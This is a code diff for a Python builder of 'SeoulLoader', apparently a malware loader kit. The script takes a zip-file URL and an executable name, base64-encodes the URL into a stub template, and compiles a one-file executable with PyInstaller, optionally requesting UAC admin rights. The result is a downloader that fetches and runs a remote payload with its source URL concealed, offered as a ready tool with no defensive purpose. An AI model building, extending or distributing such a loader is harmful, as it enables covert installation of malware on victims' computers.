@@ -1,14 +1,16 @@
 import os
 import sys
-import colorama
 from colorama import Fore, Style
-import re
 import base64
 
 def main():
     url = input('URL for zip file: ')
     if not url:
         print(Fore.RED + '[-] You must provide a URL.' + Style.RESET_ALL)
+    
+    name = input('Executable name that will be ran: ')
+    if not name:
+        print(Fore.RED + '[-] Executable Name is needed.' + Style.RESET_ALL)
 
     try:
         encoded_url = base64.b64encode(url.encode()).decode()
@@ -16,6 +18,7 @@ def main():
             content = file.read()
 
         content = content.replace('_SEOUL_URL_', f'"{encoded_url}"')
+        content = content.replace('_SEOUL_EXE_', f"{name}")
 
         if not os.path.exists('dist'):
             os.mkdir('dist')
@@ -30,14 +33,13 @@ def main():
         if admin_choice == 'y':
             print(Fore.BLUE + '[*] Building Executable with admin...' + Style.RESET_ALL)
             print(Fore.YELLOW + '[*] Requesting admin privileges...' + Style.RESET_ALL)
-            os.system('pyinstaller --onefile --uac-admin dist/built_loader.py --distpath dist --name SeoulLoader')
+            os.system(f'pyinstaller --onefile --uac-admin dist/built_loader.py --distpath dist --name SeoulLoader')
             print(Fore.GREEN + '[+] Executable built successfully with admin privileges: dist/SeoulLoader.exe' + Style.RESET_ALL)
         else:
             print(Fore.YELLOW + '[*] No admin privileges will be requested.' + Style.RESET_ALL)
-        
-        os.system('pyinstaller --onefile dist/built_loader.py --distpath dist --name SeoulLoader')
-        print(Fore.GREEN + '[+] Executable built successfully: dist/SeoulLoader.exe' + Style.RESET_ALL)
-        os.remove('dist/built_loader.py')
+            os.system('pyinstaller --onefile dist/built_loader.py --distpath dist --name SeoulLoader')
+            print(Fore.GREEN + '[+] Executable built successfully: dist/SeoulLoader.exe' + Style.RESET_ALL)
+            os.remove('dist/built_loader.py')
 
     except FileNotFoundError:
         print(Fore.RED + '[-] Error: stub/loader.py not found.' + Style.RESET_ALL)
